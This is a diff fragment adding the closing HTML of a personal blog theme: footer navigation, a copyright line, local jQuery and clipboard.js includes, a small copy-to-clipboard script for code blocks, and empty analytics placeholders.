+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Te Fuir
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
